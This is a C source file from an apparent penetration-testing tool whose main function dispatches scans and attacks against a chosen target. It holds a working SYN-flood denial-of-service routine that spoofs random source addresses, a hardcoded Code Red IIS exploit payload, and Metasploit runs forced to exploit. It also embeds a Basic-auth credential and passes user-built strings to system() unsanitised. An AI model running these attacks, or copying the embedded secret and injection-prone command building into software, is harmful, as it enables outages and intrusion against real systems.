
#include <errno.h>
#include <string.h>
#include <netinet/ip.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <readline/history.h>
#include <arpa/inet.h>
#include "../auditing-cybersecurity.h"
#include "../others/networking.h"
#include "../activities/activities.h"
#include <unistd.h>

int any(int type){
	FILE *f=NULL;
	char msg[BUFFER_SIZE_1K]="", cmd[BUFFER_SIZE_2K]="";
	unsigned char *serverResp=NULL;
	switch(type){
	case ANY_BANNER_GRABBING:
		printf("  Probable OS (TTL Fingerprinting): %s%s%s\n\n", C_HWHITE, target.portsToScan[get_port_index(portUnderHacking)].operatingSystem, C_DEFAULT);
		printf("  Probable Service (IANA spec): %s%s%s\n\n", C_HWHITE,target.portsToScan[get_port_index(portUnderHacking)].serviceName, C_DEFAULT);
		switch(target.portsToScan[get_port_index(portUnderHacking)].connectionType){
		case SOCKET_CONN_TYPE:
			printf("  Connection supported: %sSocket%s\n\n", C_HWHITE, C_DEFAULT);
			break;
		case SSL_CONN_TYPE:
			printf("  Connection supported: %sSSL%s\n\n", C_HWHITE, C_DEFAULT);
			break;
		case SSH_CONN_TYPE:
			printf("  Connection supported: %sSSH%s\n\n", C_HWHITE, C_DEFAULT);
			break;
		default:
			break;
		}
		char **queries=NULL;
		double msgs=open_file_str(resourcesLocation, "socket_banner_grabbing_strings.txt", &f, &queries);
		if(msgs==RETURN_ERROR){
			free_char_double_pointer(&queries,msgs);
			return OPENING_FILE_ERROR;
		}
		fclose(f);
		for(int i=0;i<msgs && cancelCurrentProcess==FALSE;i++){
			int sk=0;
			ssize_t c=format_strings_from_files(queries[i], msg);
			int bytesRecv=send_msg_to_server(&sk,target.targetIp, NULL, portUnderHacking,
					target.portsToScan[get_port_index(portUnderHacking)].connectionType,
					msg,&serverResp,BUFFER_SIZE_128K,0,c);
			if(bytesRecv<=0){
				free(serverResp);
				continue;
			}
			printf("  Msg: %s%s%s\n",C_HWHITE,queries[i],C_DEFAULT);
			show_message((char *) serverResp,bytesRecv, 0, RESULT_MESSAGE, TRUE);
			printf("\n");
			close(sk);
			free(serverResp);
		}
		free_char_double_pointer(&queries,msgs);
		break;
		case ANY_DOS_SYN_FLOOD_ATTACK:
			printf("DOS SYN Flood running...\n");
			srand(time(0));
			int skDos=socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
			setsockopt(skDos, SOL_SOCKET, SO_BINDTODEVICE, networkInfo.interfaceName, strlen(networkInfo.interfaceName));
			if(skDos<0) return SOCKET_SETOPT_ERROR;
			char datagram[4096];
			struct iphdr *iph = (struct iphdr *) datagram;
			struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
			struct sockaddr_in  dest;
			struct PseudoHeader psh;
			int sourcePort=rand()%50000+10000;
			char sourceIp[20]="";
			sprintf(sourceIp,"%d.%d.%d.%d", rand()%255+1, rand()%255+1, rand()%255+1, rand()%255+1);
			memset(datagram,0,4096);
			//dest_ip.s_addr=ip;
			iph->ihl = 5;
			iph->version = 4;
			iph->tos = 0;
			iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
			int hton=rand()%50000+10000;
			iph->id = htons (hton);
			iph->frag_off = htons(16384);
			iph->ttl = 255; //spoofed
			iph->protocol = IPPROTO_TCP;
			iph->check = 0;
			iph->saddr = inet_addr (sourceIp);
			iph->daddr = target.targetIp.s_addr;
			iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
			tcph->source = htons (sourcePort);
			tcph->dest = htons (portUnderHacking);
			tcph->seq = htonl(1234567890);
			tcph->ack_seq = 0;
			tcph->doff = sizeof(struct tcphdr)/4;
			tcph->fin=0;
			tcph->syn=1;
			tcph->rst=0;
			tcph->psh=0;
			tcph->ack=0;
			tcph->urg=0;
			tcph->window = htons(14600);
			tcph->check = 0;
			tcph->urg_ptr = 0;
			int one=1;
			const int *val = &one;
			if(setsockopt(skDos, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) return show_message("setsockopt() error. ",0, errno, ERROR_MESSAGE, TRUE);
			dest.sin_family=AF_INET;
			dest.sin_addr.s_addr=target.targetIp.s_addr;
			tcph->dest=htons(portUnderHacking);
			tcph->check=0;
			psh.source_address=inet_addr(sourceIp);
			psh.dest_address=dest.sin_addr.s_addr;
			psh.placeholder=0;
			psh.protocol=IPPROTO_TCP;
			psh.tcp_length=htons(sizeof(struct tcphdr));
			printf("Flooding from: %s:%d...\n",sourceIp, sourcePort);
			while(!cancelCurrentProcess){
				memcpy(&psh.tcp,tcph,sizeof(struct tcphdr));
				tcph->check=csum((unsigned short*) &psh,sizeof(struct PseudoHeader));
				if(sendto(skDos,datagram,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &dest,sizeof (dest))<0) return SENDING_PACKETS_ERROR;
			}
			close(skDos);
			printf("DOS SYN Flood finished...\n\n");
			break;
		case ANY_NMAP_VULNER_SCAN:
			snprintf(cmd,sizeof(cmd),"nmap -sV -p %d --script vulners %s",portUnderHacking, target.strTargetIp);
			system_call(cmd);
			break;
		case ANY_CODE_RED:
			snprintf(msg, sizeof(msg),"%s%c%c%c%c", "GET /C_DEFAULT.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
					"NNNNNNNNNNNNNNNNNN NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
					"NNNNNNNNNNNN NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN"
					"NNNNNN NNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u780"
					"1%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078"
					"%u0000%u00=a HTTP/1.0",'\r','\n','\r','\n');
			int sk=0;
			int bytesRecv=send_msg_to_server(&sk,target.targetIp,NULL, portUnderHacking, target.portsToScan[get_port_index(portUnderHacking)].connectionType
					,msg,&serverResp,BUFFER_SIZE_128K,0, strlen(msg));
			close(sk);
			if(bytesRecv==RETURN_ERROR) show_message("Error creating socket. Maybe the port is blocked. Wait, and try again in a while.",0,0, ERROR_MESSAGE,1);
			show_message((char *) serverResp,bytesRecv,0, RESULT_MESSAGE, TRUE);
			if(serverResp!=NULL) free(serverResp);
			break;
		case ANY_SEARCH_MSF:
			do{
				char *strSearch= get_readline("  Insert string to search(;=exit): ", TRUE);
				if(strcmp(strSearch,";")==0){
					printf("\n");
					free(strSearch);
					break;
				}
				snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'search %s; exit'",strSearch);
				system_call(cmd);
				free(strSearch);
			}while(TRUE);
			break;
		case ANY_RUN_MSF:
			do{
				char *strSearch=get_readline("  Insert module to use (;=exit): ",TRUE);
				if(strcmp(strSearch,";")==0){
					printf("\n");
					free(strSearch);
					break;
				}
				char *confirmation="";
				printf("\n");
				do{
					confirmation=get_readline("  Use current port (y|default), or msf default (n): ",FALSE);
				}while(strcmp(confirmation,"y")!=0 && strcmp(confirmation,"")!=0 && strcmp(confirmation,"n")!=0);
				printf("\n");
				char userFilePath[BUFFER_SIZE_512B]="", passFilePath[BUFFER_SIZE_512B]="";
				snprintf(userFilePath, sizeof(userFilePath),"%s%s", resourcesLocation, "msf_users.txt");
				snprintf(passFilePath, sizeof(userFilePath),"%s%s", resourcesLocation, "msf_passwords.txt");
				if(strcmp(confirmation,"y")==0 || strcmp(confirmation,"")==0){
					snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use %s;"
							"set RHOSTS %s;"
							"set RPORT %d;"
							"set LHOST %s;"
							"set SRVHOST %s;"
							"set USER_FILE %s;"
							"set PASS_FILE %s;"
							"set DOMAIN %s;"
							"set ForceExploit true;"
							"exploit;exit'",strSearch,target.strTargetIp, portUnderHacking, networkInfo.interfaceIp, networkInfo.interfaceIp,
							userFilePath, passFilePath,target.strTargetIp);
				}else{
					snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use %s;"
							"set RHOSTS %s;"
							"set LHOST %s;"
							"set SRVHOST %s;"
							"set USER_FILE %s;"
							"set PASS_FILE %s;"
							"set DOMAIN %s;"
							"set ForceExploit true;"
							"exploit;exit'",strSearch,target.strTargetIp, networkInfo.interfaceIp, networkInfo.interfaceIp,
							userFilePath,passFilePath,target.strTargetIp);
				}
				free(strSearch);
				system_call(cmd);
				PRINT_RESET;
			}while(TRUE);
			break;
		case ANY_SEARCH_NMAP:
			do{
				char *strSearch=get_readline("  Insert string to search(;=exit): ", TRUE);
				if(strcmp(strSearch,";")==0){
					printf("\n");
					free(strSearch);
					break;
				}
				printf("\n");
				snprintf(cmd,sizeof(cmd),"locate *.nse | grep %s",strSearch);
				system_call(cmd);
				free(strSearch);
				PRINT_RESET;
			}while(TRUE);
			break;
		case ANY_RUN_NMAP:
			do{
				char *strSearch=get_readline("  Insert script to use (;=exit): ", TRUE);
				if(strcmp(strSearch,";")==0){
					printf("\n");
					free(strSearch);
					break;
				}
				snprintf(cmd,sizeof(cmd),"nmap -p%d --script=%s %s",portUnderHacking, strSearch,target.strTargetIp);
				system_call(cmd);
				free(strSearch);
				PRINT_RESET;
			}while(TRUE);
			break;
		case ANY_SQL_MAP:
			char **sqlmapCommands=NULL;
			int totalStrings=open_file_str(resourcesLocation, "sqlmap_commands.txt", &f, &sqlmapCommands);
			if(totalStrings==RETURN_ERROR) return OPENING_FILE_ERROR;
			fclose(f);
			do{
				char *sqlCmd=get_readline("![#]=templates,;=exit)-> ", FALSE);
				if(strcmp(sqlCmd,";")==0) {
					free(sqlCmd);
					break;
				}
				if(strcmp(sqlCmd,"!")==0){
					for(int i=0;i<totalStrings;i++) printf("\n  %d) %s", i+1, sqlmapCommands[i]);
					printf("\n\n");
					free(sqlCmd);
					continue;
				}
				if(sqlCmd[0]=='!' && strlen(sqlCmd)>1){
					char buf[BUFFER_SIZE_32B]="";
					for(int i=1;i<strlen(sqlCmd);i++) buf[i-1]=sqlCmd[i];
					long int selectedOpt=strtol(buf,NULL,10);
					if(selectedOpt<1 || selectedOpt>totalStrings){
						show_message("Option not valid\n",0, 0, ERROR_MESSAGE, TRUE);
						free(sqlCmd);
						continue;
					}
					format_strings_from_files(sqlmapCommands[selectedOpt-1], sqlmapCommands[selectedOpt-1]);
					char *userResp=NULL, url[BUFFER_SIZE_512B]="",cookie[BUFFER_SIZE_512B]="";
					printf("\n");
					userResp=get_readline("  Insert URL (ip:port by default): ",FALSE);
					if(strcmp(userResp,"")==0){
						snprintf(url,BUFFER_SIZE_512B,"\"%s:%d\"",target.strTargetIp,portUnderHacking);
					}else{
						snprintf(url,BUFFER_SIZE_512B,"\"%s\"",userResp);
					}
					userResp=get_readline("  Insert cookie value: ",FALSE);
					if(strcmp(userResp, "")!=0) snprintf(cookie, BUFFER_SIZE_128B, "--cookie=\"%s\"", userResp);
					printf("\n");
					snprintf(msg,BUFFER_SIZE_1K, sqlmapCommands[selectedOpt-1], url, cookie);
					add_history(msg);
					continue;
				}
				add_history(sqlCmd);
				printf("\n");
				system(sqlCmd);
				free(sqlCmd);
			}while(TRUE);
			free_char_double_pointer(&sqlmapCommands, totalStrings);
			break;
		case ANY_ARP_SNIFFING:
			arp(ANY_ARP_SNIFFING);
			PRINT_RESET;
			break;
		case ANY_SEARCH_CVE:
			srand(time(0));
			char httpMsg[BUFFER_SIZE_512B]="";
			char *host="www.opencve.io";
			char *nistIP=hostname_to_ip(host);
			if(nistIP==NULL) return RETURN_ERROR;
			struct in_addr ip;
			ip.s_addr=inet_addr(nistIP);
			do{
				cancelCurrentProcess=FALSE;
				unsigned char *serverResp=NULL;
				char *msg=get_readline(";=exit)-> ", TRUE);
				if(strcmp(msg,";")==0){
					free(msg);
					break;
				}
				for(int i=0;i<strlen(msg);i++){
					if(msg[i]==' ' || msg[i]=='\"') msg[i]='+';
				}
				snprintf(httpMsg,BUFFER_SIZE_512B,
						"GET /api/cve?search=%s HTTP/1.1\r\n"
						"Host: %s\r\n"
						"Authorization: Basic THVjaDpMdWlzNzgh\r\n"
						"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
						"Accept: */*\r\n\r\n",msg,host);
				free(msg);
				int bytesRecv=0, sk=0;
				if((bytesRecv=send_msg_to_server(&sk,ip,host, 443, SSL_CONN_TYPE, httpMsg, &serverResp, BUFFER_SIZE_16K,30000,
						strlen(httpMsg)))<0){
					return RETURN_ERROR;
				}
				close(sk);
				char *token="\"id\": \"";
				char *json=strstr((char *)serverResp,token);
				if(json==NULL){
					free(serverResp);
					show_message("No results found.", strlen("No results found."), 0, INFO_MESSAGE, TRUE);
					PRINT_RESET;
					continue;
				}
				int cont=0, cveId=1;
				while(json!=NULL && cont<bytesRecv){
					printf("%s\n\t%d) ",C_HWHITE,cveId);
					for(cont=strlen(token);;cont++){
						if((json[cont]=='"'&& json[cont+1]==',') || cont>=bytesRecv) break;
						printf("%c",json[cont]);
						json[cont-strlen(token)]='X';
					}
					printf("%s:",C_DEFAULT);
					cont+=2;
					for(int i=cont+strlen("\"summary\": ");;i++,cont++){
						if((json[i]=='"'&& json[i+1]==',') || cont>=bytesRecv) break;
						if(json[i]=='\\'){
							switch(json[i+1]){
							case 'n':
								//printf("");
								break;
							case '"':
								printf("\"");
								break;
							case '\\':
								printf("\\");
								break;
							default:
								break;
							}
							i++;
							continue;
						}
						printf("%c",json[i]);
					}
					printf("\"\n  ");
					json=strstr(json,token);
					if(cont>=bytesRecv || cveId==20){
						show_message("Max. size per page achieved.", 0, 0, ERROR_MESSAGE, TRUE);
						break;
					}
					cveId++;
				}
				free(serverResp);
				PRINT_RESET;
			}while(TRUE);
			break;
		default:
			break;
	}
	clear_history();
	return RETURN_OK;
}
